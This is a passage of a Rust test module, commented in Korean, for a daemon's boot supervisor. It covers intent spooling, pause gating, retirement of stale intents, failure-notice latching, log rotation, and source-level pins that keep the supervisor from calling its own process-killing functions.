        let dir = tmp_spool("paused");
        enqueue_in(&dir, &req("p", None), 0.0).unwrap();
        let mut st = SupState::default();
        d.paused.store(true, Ordering::SeqCst);
        for _ in 0..5 {
            assert_eq!(
                tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0),
                0,
                "pause 중에 감독자가 프로세스를 낳았다(kill-switch 관통)"
            );
        }
        assert!(intent_path(&dir, "p").exists(), "pause 중에 스풀을 건드렸다");
        // 재개하면 종전 그대로 낳는다 — 게이트는 동결이지 폐기가 아니다.
        d.paused.store(false, Ordering::SeqCst);
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0), 1);
    }

    /// ★(R3-P2-5) 전제 붕괴(claim_stale)는 재시도가 아니라 **폐기**다 — 남은 예산을 태우며
    /// 같은 판정을 반복하지 않는다(무스폰·이벤트 1건·인텐트 제거).
    #[test]
    fn claim_stale_retires_immediately_without_retry() {
        let d = tmp_daemon("stale");
        let dir = tmp_spool("stale");
        enqueue_in(&dir, &req("c", Some(7)), 0.0)
            .unwrap();
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..20 {
            total += tick_in(&d, &dir, &mut st, stale_runner, remove_spool_file, now);
            now += 60.0; // 쿨다운을 계속 넘겨 준다 — 재시도 계급이라면 3회까지 갔을 것.
        }
        assert_eq!(total, 1, "claim_stale 이 재시도 계급으로 접혔다({total}회 디스패치)");
        assert!(!intent_path(&dir, "c").exists(), "claim_stale 인텐트가 스풀에 남았다");
    }

    /// ★(R3-P2-5) 프로덕션 실행자의 레지스트리 재실측 게이트 — roles 에 master 가 없으면
    /// (또는 다른 surface 가 쥐면) 스폰 없이 `Retire("claim_stale")` 로 돌아온다.
    /// (성공 leg 는 실 스폰이라 여기서 재지 않는다 — 순수 판정은 아래 진리표가 전수한다.)
    #[test]
    fn run_ensure_team_refuses_a_stale_claim_before_any_spawn() {
        let d = tmp_daemon("regate");
        let mut it = intent("r");
        it.surface_id = Some(7); // 등록된 surface 도, master 보유도 없다.
        it.created_at = 0.0;
        it.decl_origin = DECL_ORIGIN_HOOK_HUMAN.into();
        it.claim_rc = Some(0);
        it.claim_at = Some(0.0);
        assert_eq!(
            run_ensure_team(&d, &it, BootAction::EnsureTeam),
            Err(RunErr::Retire("claim_stale")),
            "레지스트리가 부정하는 claim 으로 스폰 경로에 진입했다"
        );
    }

    /// ★(R4 수정 라운드) surface_id 부재 인텐트(스풀 직접 투하 계급)는 프로덕션 실행자가
    /// 스폰 없이 `Retire("no_surface")` 로 접는다 — 신원 env 0 스폰(rc6 ×MAX_ATTEMPTS)의
    /// 표면 축소. 정상 생산자(boot.enqueue)는 항상 Some(sid)이므로 프로덕션 경로 무손실.
    #[test]
    fn run_ensure_team_refuses_a_surfaceless_intent_before_any_spawn() {
        let d = tmp_daemon("nosurface");
        let mut it = intent("n");
        it.surface_id = None; // 유일 생산자(boot.enqueue)가 만들 수 없는 형상.
        it.created_at = 0.0;
        it.decl_origin = DECL_ORIGIN_HOOK_HUMAN.into();
        assert_eq!(
            run_ensure_team(&d, &it, BootAction::EnsureTeam),
            Err(RunErr::Retire("no_surface")),
            "신원 없는 인텐트가 스폰 경로에 진입했다 — fail-closed 게이트 미동작"
        );
    }

    /// (R3-P2-5) 재실측 순수 판정 진리표 — 보유 일치 ∧ 생존일 때만 참.
    #[test]
    fn master_holds_truth_table() {
        assert!(master_holds(Some(7), 7, true), "보유+생존이 거짓으로 판정됐다");
        assert!(!master_holds(Some(7), 7, false), "죽은 좌석의 claim 이 신선 판정됐다");
        assert!(!master_holds(Some(8), 7, true), "남이 쥔 master 가 내 claim 으로 판정됐다");
        assert!(!master_holds(None, 7, true), "빈 레지스트리가 보유로 판정됐다");
    }

    /// ★(P2-2 · ANCHOR-1 ④) PATH 선두 = 데몬 exe_dir — bare "cys" 해소 보장.
    /// 기존 PATH 는 순서 그대로 뒤에 보존된다(python3 등 후속 해소를 깨지 않는다).
    #[test]
    fn path_injection_puts_exe_dir_first_and_keeps_the_rest() {
        let exe = std::env::temp_dir().join("cys_bsup_exedir");
        let old = std::env::join_paths([Path::new("/usr/bin"), Path::new("/bin")]).unwrap();
        let joined = path_with_exe_dir_first(&exe, Some(old));
        let parts: Vec<PathBuf> = std::env::split_paths(&joined).collect();
        assert_eq!(parts.first(), Some(&exe), "exe_dir 가 PATH 선두가 아니다: {parts:?}");
        assert!(
            parts[1..].iter().any(|p| p == Path::new("/usr/bin"))
                && parts[1..].iter().any(|p| p == Path::new("/bin")),
            "기존 PATH 성분이 소실됐다: {parts:?}"
        );
        // PATH 부재(최소 env 데몬)에서도 exe_dir 한 조각은 반드시 남는다.
        let alone = path_with_exe_dir_first(&exe, None);
        assert_eq!(
            std::env::split_paths(&alone).next().as_ref(),
            Some(&exe),
            "PATH 부재에서 exe_dir 단독 주입이 안 됐다"
        );
    }

    /// boot-supervisor.log 회전 1겹 — 상한 초과에서만 `.1` 로 밀린다.
    #[test]
    fn log_rotation_is_one_layer_and_cap_gated() {
        let dir = tmp_spool("logrot");
        let log = dir.join("boot-supervisor.log");
        std::fs::write(&log, b"small").unwrap();
        rotate_log_if_huge(&log);
        assert!(log.exists(), "상한 미만 로그가 회전됐다");
        let big = vec![b'x'; (LOG_MAX_BYTES + 1) as usize];
        std::fs::write(&log, &big).unwrap();
        rotate_log_if_huge(&log);
        assert!(!log.exists(), "상한 초과 로그가 제자리에 남았다");
        assert!(dir.join("boot-supervisor.log.1").exists(), "회전본(.1)이 없다");
    }

    /// ★(오너 결정 ⑧c) 소진 종착은 loud 다 — 스폰 실패 소진 시 feed 통보가 나가고, 같은
    /// 인텐트가 이후 `attempts_exhausted` 폐기 지점을 다시 지나도 통보는 **1회로 접힌다**
    /// (삭제 실패 최악 형상: 두 관측 지점을 모두 지나는 경로).
    #[test]
    fn exhaustion_notification_fires_once_across_both_paths() {
        let d = tmp_daemon("loudonce");
        let dir = tmp_spool("loudonce");
        enqueue_in(&dir, &req("L", None), 0.0).unwrap();
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..100 {
            // never_removes: 소진 후에도 파일이 남아 Retire(attempts_exhausted) 지점을 매 틱 지난다.
            tick_in(&d, &dir, &mut st, fail_runner, never_removes, now);
            now += 60.0;
        }
        let fails = d
            .feed_items
            .lock()
            .unwrap()
            .iter()
            .filter(|i| i.kind == "bootstrap-fail")
            .count();
        assert_eq!(fails, 1, "소진 통보가 1회로 접히지 않았다: {fails}건 (매 틱 반복 = 폭주)");
    }

    /// ★(오너 결정 ⑧c) 선언 surface 가 살아 있으면 — 원장 **선기록** 후 1줄 통보가 그 pane 으로
    /// 간다(Windows 포함 — cfg 게이트 없음). 원장(delivery ledger)에 통보 문안이 실재해야 한다.
    #[test]
    fn exhaustion_notice_reaches_the_declaring_surface_with_ledger_first() {
        let d = tmp_daemon("loudpane");
        let s = d
            .create_surface(None, Some("sleep 30".into()), None, None, 24, 80)
            .expect("test surface");
        d.surfaces.lock().unwrap().insert(s.id, s.clone());
        let dir = tmp_spool("loudpane");
        enqueue_in(&dir, &req("N", Some(s.id)), 0.0)
            .unwrap();
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..10 {
            tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 60.0;
        }
        let items = d.feed_items.lock().unwrap();
        let item = items
            .iter()
            .find(|i| i.kind == "bootstrap-fail")
            .expect("소진 feed 통보 부재");
        assert_eq!(item.surface_id, Some(s.id), "통보의 선언 surface 귀속 소실");
        drop(items);
        // 원장은 전문이 아니라 preview(64자)+sha256 를 남긴다 — 문안 선두의 안정 마커로 판정.
        // ★마커 갱신(R2): 트리거가 '예산 소진'에서 '스폰 0회'로 넓어지며 문안 선두가 사유
        //   무관 공통구로 바뀌었다(사유는 뒤쪽 `no_spawn_reason` 분기).
        let ledger = std::fs::read_to_string(crate::delivery::ledger_path(&d.socket_path))
            .unwrap_or_default();
        assert!(
            ledger.contains("팀이 이 선언으로 뜨지 않았다"),
            "무스폰 통보가 원장 선기록 없이 나갔다(기계 push 오너 임무 오인 창) — 원장: {ledger:?}"
        );
    }

    /// ★(R2 must_fix) **스폰 0회 종착은 전부 loud 다** — 종전엔 `attempts_exhausted` 하나만
    /// 통보했고 `claim_stale` 은 버스 이벤트만 낸 채 사라졌다(frontdoor note 가 '소진 시 이
    /// 화면과 승인 Feed 로 통보한다'고 약속한 뒤의 침묵). 형제 검체
    /// `claim_stale_retires_immediately_without_retry` 는 '재시도 안 함'만 재고 통보 유무는
    /// 재지 않아 GREEN 을 유지했다 — 그 사각을 이 검체가 관통한다.
    #[test]
    fn claim_stale_retire_is_loud_not_silent() {
        let d = tmp_daemon("staleloud");
        let dir = tmp_spool("staleloud");
        enqueue_in(&dir, &req("c", Some(7)), 0.0)
            .unwrap();
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..10 {
            tick_in(&d, &dir, &mut st, stale_runner, remove_spool_file, now);
            now += 60.0;
        }
        let items = d.feed_items.lock().unwrap();
        let hits: Vec<_> = items.iter().filter(|i| i.kind == "bootstrap-fail").collect();
        assert_eq!(
            hits.len(),
            1,
            "claim_stale 폐기의 통보가 {}건이다(0=조용한 포기 / 2+=래치 파손)",
            hits.len()
        );
        assert!(
            hits[0].body.contains("claim_stale") && hits[0].body.contains("master"),
            "통보 문안이 사유를 말하지 않는다: {:?}",
            hits[0].body
        );
    }

    /// ★(R2 must_fix) `expired` 폐기도 loud 다 — kill-switch pause 가 30분을 넘겨 유지되면
    /// 재개 순간 전 인텐트가 이 갈래로 소각된다(도달 경로가 가장 현실적인 침묵 표면).
    ///
    /// 동시에 **채널 분리**를 잰다: 3건이 한꺼번에 만료돼도 ⓐ feed 통보는 3건 전부 나가고
    /// (조용히 사라지는 갈래 0) ⓑ 폐기는 통보 예산과 무관하게 같은 틱에 끝난다(GC 를 통보에
    /// 묶으면 쓰레기 스풀이 줄지 않는다) ⓒ 반복 틱이 통보를 늘리지 않는다(래치).
    #[test]
    fn expired_retire_is_loud_on_every_intent_and_gc_is_not_gated_by_notice() {
        let d = tmp_daemon("expired");
        let dir = tmp_spool("expired");
        for id in ["e1", "e2", "e3"] {
            enqueue_in(&dir, &req(id, None), 0.0)
                .unwrap();
        }
        let mut st = SupState::default();
        let now = INTENT_MAX_AGE_SECS + 10.0; // 전건 만료
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now), 0);
        let count_fails = |d: &Arc<Daemon>| {
            d.feed_items
                .lock()
                .unwrap()
                .iter()
                .filter(|i| i.kind == "bootstrap-fail")
                .count()
        };
        assert_eq!(
            count_fails(&d),
            3,
            "만료 폐기의 통보가 3건이 아니다 — 조용히 사라지는 갈래가 남았다"
        );
        for id in ["e1", "e2", "e3"] {
            assert!(
                !intent_path(&dir, id).exists(),
                "만료 인텐트 {id} 가 스풀에 남았다 — GC 가 통보 예산에 묶였다"
            );
        }
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now + 1.0);
        assert_eq!(count_fails(&d), 3, "반복 틱이 통보를 늘렸다(래치 파손)");
    }

    /// 데몬 재시작 픽업(스풀에 남은 소진 인텐트)도 조용한 폐기가 아니라 loud 종착이다.
    #[test]
    fn restart_pickup_of_exhausted_intent_is_loud() {
        let d = tmp_daemon("pickup");
        let dir = tmp_spool("pickup");
        raw_intent(
            &dir,
            "old",
            &format!(
                r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                    "created_at":1.0,"attempts":{MAX_ATTEMPTS},"next_attempt_at":0.0,"reason":"t"}}"#
            ),
        );
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0), 0);
        assert!(!intent_path(&dir, "old").exists(), "소진 인텐트가 스풀에 남았다");
        let fails = d
            .feed_items
            .lock()
            .unwrap()
            .iter()
            .filter(|i| i.kind == "bootstrap-fail")
            .count();
        assert_eq!(fails, 1, "재시작 픽업 소진이 조용히 폐기됐다(통보 {fails}건)");
    }

    /// 제거자의 성공 정의 — "이제 이 경로에 파일이 없다"(남이 먼저 지운 경우 포함).
    #[test]
    fn remover_reports_absence_as_success() {
        let dir = tmp_spool("remover");
        let p = dir.join("gone.json");
        assert!(remove_spool_file(&p), "이미 없는 경로는 성공이어야 한다");
        std::fs::write(&p, "x").unwrap();
        assert!(remove_spool_file(&p), "평범한 파일 삭제 실패");
        assert!(!p.exists());
    }

    // ── 소스 핀(관례: governance.rs `queue_delivery_single_helper_shared_by_tick_and_rpc`) ──

    /// 프로덕션 슬라이스에서 `//` 줄주석을 **제거**한다.
    ///
    /// 왜 필요한가: 아래 금칙어 핀은 "이 코드가 무엇을 **부르는가**"를 보는 장치인데, 주석은
    /// 부르는 것이 아니라 설명하는 것이다. 주석 한 줄로 핀이 적색이 되면 다음 사람은 핀을
    /// 완화하거나 설명을 지운다 — 둘 다 나쁘다. 반대로 주석 한 줄로 핀이 **초록**이 되는 일도
    /// 없어야 한다(그쪽이 더 위험하다). 그래서 판정 대상에서 주석을 통째로 뺀다.
    /// (문자열 리터럴 안의 `//` 까지 다루는 완전한 렉서가 아니다 — 이 파일에는 그런 리터럴이
    ///  없고, 생기면 아래 핀들이 곧바로 적색으로 알려 준다.)
    fn strip_line_comments(src: &str) -> String {
        src.lines()
            .map(|l| match l.find("//") {
                Some(i) => &l[..i],
                None => l,
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// ★불변식 — **원장 기록이 행위보다 앞**이다(`dispatch_one` 안에서 순서 역전 금지).
    #[test]
    fn ledger_record_precedes_the_action() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let prod = prod.as_str();
        let at = prod.find("fn dispatch_one(").expect("dispatch_one 소실");
        let body = &prod[at..];
        let rec = body.find("record_audited(").expect("감독자 원장 기록 지점 소실");
        let run = body.find("runner(daemon").expect("실행자 호출 지점 소실");
        assert!(
            rec < run,
            "원장 기록이 행위 뒤로 갔다 — 그 창에서 임무 게이트가 기계 push 를 오너 임무로 오인한다"
        );
        // ★핀 개정(P2 · 오너 결정 ⑧c — 약화 아님, 상한 이동): 무스폰 loud 통보(notify_no_spawn)
        //   도 pane 주입 전에 같은 유래(Origin::Supervisor)로 원장 선기록해야 하므로 지정 지점이
        //   dispatch_one + notify_no_spawn **정확히 2곳**이 됐다. 여전히 닫힌 집합 단언이다 —
        //   제3 지점 유입은 이 핀이 계속 적색으로 잡는다(구현 갈라짐 차단 목적 불변).
        assert_eq!(
            prod.matches("crate::delivery::Origin::Supervisor").count(),
            2,
            "감독자 원장 유래 지정 지점은 정확히 2곳(dispatch_one·notify_no_spawn)이어야 한다"
        );
        // notify_no_spawn 쪽도 순서 불변식이 같다 — 원장 기록이 주입(try_send)보다 앞.
        let nat = prod.find("fn notify_no_spawn(").expect("notify_no_spawn 소실");
        let nbody = &prod[nat..];
        let nrec = nbody.find("record_audited(").expect("소진 통보 원장 기록 지점 소실");
        let ninj = nbody.find("write_tx.try_send(").expect("소진 통보 주입 지점 소실");
        assert!(
            nrec < ninj,
            "소진 통보의 원장 기록이 주입 뒤로 갔다 — 기계 push 오너 임무 오인 창"
        );
    }

    /// ★(R2) provenance 상속 절단이 **실재 배선**인가 — 소스 단언.
    ///
    /// 판정이 '주지 않기로' 결론 낸 값은 상속되는 것이 아니라 **없어야 한다**. 조건부 `env`
    /// 만 있고 `env_remove` 가 없으면 데몬 env 오염(훅 자손 autostart 로 뜬 cysd 가 들고 있는
    /// `hook-human`·타 pane 토큰)이 그대로 자식에게 흘러 기계유래 게이트를 통과한 적 없는
    /// 인텐트가 부서 자동 생성 봉인을 연다. 배선은 두 줄이라 행위 검체를 세우기보다(실 스폰
    /// 필요) 소스로 못 박는 편이 정직하다.
    #[test]
    fn provenance_env_is_withheld_as_absent_not_inherited() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn run_ensure_team(").expect("run_ensure_team 소실");
        let body = &prod[at..];
        for key in ["env_remove(\"CYS_DECL_ORIGIN\")", "env_remove(cys::ENV_SEAT_TOKEN)"] {
            assert!(
                body.contains(key),
                "run_ensure_team 에 {key} 가 없다 — 주입하지 않기로 한 값이 데몬 env 에서 \
                 상속된다(부서 자동 생성 봉인 무료 개방 · 타 pane 좌석 토큰 유출)"
            );
        }
        // 지우기가 조건부 주입보다 **앞**이어야 한다(뒤면 주입을 지운다).
        let rm = body.find("env_remove(\"CYS_DECL_ORIGIN\")").unwrap();
        let set = body
            .find("cmd.env(\"CYS_DECL_ORIGIN\", &it.decl_origin)")
            .expect("조건부 provenance 주입 소실");
        assert!(rm < set, "env_remove 가 조건부 주입 뒤로 갔다 — 주입을 지운다");
        assert!(
            body.contains("env(cys::ENV_ROLE, \"master\")"),
            "감독자 자식의 CYS_ROLE 이 명시되지 않았다 — pane 상속 role 이 master 부트의 \
             boot-last `role` 필드로 기록돼 §0-A 가 읽는 사실이 조용히 거짓이 된다"
        );
    }

    /// ★(R2 must_fix) **스폰 0회 종착의 닫힌 집합이 전부 loud 인가** — 소스 단언.
    ///
    /// 행위 검체(`claim_stale_retire_is_loud_not_silent`·`expired_retire_is_loud_…`)는 두
    /// 사유만 관통한다. 종착 갈래는 셋이고(판정 폐기 · 실행자 폐기 · 마지막 시도 실패),
    /// 새 갈래가 추가되면서 통보를 빠뜨리는 것이 정확히 R2 가 적발한 회귀 양식이라 **갈래
    /// 수 자체**를 못 박는다. 값이 바뀌어야 한다면 그건 계약 변경이고, 그때 이 주석과 함께
    /// 갱신하라(정직성 불변식: 훅 frontdoor note 의 '통보한다' 약속과 짝이다).
    #[test]
    fn every_no_spawn_terminal_is_loud() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn tick_in(").expect("tick_in 소실");
        let body = &prod[at..];
        assert_eq!(
            body.matches("notify_no_spawn(").count(),
            3,
            "tick_in 의 무스폰 통보 지점이 3곳(판정 폐기·실행자 폐기·마지막 시도 실패)이 \
             아니다 — 종착 갈래가 늘었는데 통보를 빠뜨렸거나, 통보가 사라졌다"
        );
        // 판정 폐기 갈래에서는 **통보가 삭제보다 앞**이다(예산 부족 시 '조용히 지우기'가
        // 아니라 '이번 틱 건너뛰기'로 접히게 하는 순서 — R2 fix_direction 그대로).
        let arm = body
            .find("Disposition::Retire(why) => {")
            .expect("판정 폐기 갈래 소실");
        let arm_body = &body[arm..];
        let notify = arm_body.find("notify_no_spawn(").expect("판정 폐기 갈래의 통보 소실");
        let remove = arm_body.find("remove_and_gate(").expect("판정 폐기 갈래의 삭제 소실");
        assert!(
            notify < remove,
            "판정 폐기 갈래에서 삭제가 통보보다 앞이다 — 통보 예산이 마르면 조용히 지워진다"
        );
    }

    /// 파괴/재기동 어휘 — 감독자 코드에 **한 글자도** 있으면 안 되는 호출들.
    const DESTRUCTIVE: [&str; 7] = [
        "close_surface",
        "kill_on_drop(true)",
        "check_agent_death",
        "launch_via_cli",
        "restart_counts",
        "reap_",
        ".kill(",
    ];

    /// 금칙어 탐지기(주석 제거 후 판정). 반환 = 적발된 어휘 목록.
    fn destructive_hits(src_slice: &str) -> Vec<&'static str> {
        let code = strip_line_comments(src_slice);
        DESTRUCTIVE
            .iter()
            .copied()
            .filter(|w| code.contains(w))
            .collect()
    }

    /// ★롤백 스위치가 **실제 배선**이다 — `spawn` 이 판정을 먼저 하고 태스크 전에 빠져나간다.
    /// (순수 코어만 맞고 배선이 없으면 노브를 눌러도 감독자가 뜬다 = 롤백 사문.)
    #[test]
    fn rollback_switch_is_wired_before_the_task_is_spawned() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("pub fn spawn(").expect("spawn 소실");
        let body = &prod[at..];
        let judge = body.find("supervisor_off_from(").expect("롤백 판정 호출 소실");
        let ret = body.find("        return;").expect("조기 return(=미기동) 소실");
        let task = body.find("tokio::spawn(").expect("태스크 기동 지점 소실");
        assert!(
            judge < ret && ret < task,
            "롤백 판정이 태스크 기동보다 뒤다 — 노브를 눌러도 감독자가 뜬다(롤백 사문)"
        );
        // ★(P2 · R3-P2-4) 생존 플래그 set 은 조기 return **뒤** · 태스크 기동 **앞**이다.
        //   return 앞이면 꺼진 감독자가 살아있다고 주장하고(supervisor_off 스큐 재발),
        //   태스크 뒤면 기동 직후 enqueue 가 잠깐 거절된다(불필요한 legacy 폴백).
        let alive = body
            .find("supervisor_alive.store(true")
            .expect("감독자 생존 플래그 set 지점 소실(R3-P2-4 blocker 재발)");
        assert!(
            ret < alive && alive < task,
            "생존 플래그 set 위치가 계약(조기 return 뒤·태스크 기동 앞)을 벗어났다"
        );
        // env 판독은 이 1지점뿐이다(축별 1지점 규약 — 판독 지점이 늘면 조합이 갈린다).
        assert_eq!(
            prod.matches("supervisor_off_from(").count(),
            2,
            "롤백 판정의 정의 1 + 호출 1 이어야 한다(판독 지점 산재 금지)"
        );
    }

    /// ★오살 금지 — 감독자는 **살아 있는 것을 죽이는 어떤 호출도** 하지 않는다.
    /// (설계서가 요구한 '예산 Daemon 필드 승격' 이 파일 반경 밖이라, 그 공유가 필요한 상황
    ///  자체를 만들지 않는 것으로 안전을 확보한다 — `Budget` 타입 주석 참조.)
    ///
    /// ★계측 타당성: 트리에 위반이 0 이면 탐지기가 고장나도 초록이다. 그래서 **합성 표본**으로
    /// 탐지 능력 자체를 함께 시험한다 — 금칙 호출을 코드에 심은 변조본에서 반드시 적발돼야 하고,
    /// 같은 문장을 **주석에** 넣은 변조본에서는 적발되지 않아야 한다(주석은 호출이 아니다).
    #[test]
    fn supervisor_never_kills_anything() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let hits = destructive_hits(raw);
        assert!(
            hits.is_empty(),
            "감독자에 파괴/재기동 경로가 들어왔다: {hits:?} — 오살이 오탐보다 훨씬 위험하다"
        );
        // 합성 표본 ① — 코드에 심으면 반드시 적발된다(탐지기 생존 증명).
        for w in DESTRUCTIVE {
            let mutant = format!("{raw}\nfn __mutant() {{ let _ = {w}; }}\n");
            assert_eq!(
                destructive_hits(&mutant),
                vec![w],
                "합성 변조본에서 금칙 호출 {w:?} 를 적발하지 못했다 = 탐지기 고장"
            );
        }
        // 합성 표본 ② — 주석에 있는 같은 문장은 적발하지 않는다(핀이 설명을 죽이지 않는다).
        let commented = format!("{raw}\n// 여기서 close_surface 를 부르면 안 된다\n");
        assert!(
            destructive_hits(&commented).is_empty(),
            "주석 문장을 위반으로 읽었다 — 다음 사람이 설명을 지우거나 핀을 완화하게 된다"
        );
    }
}
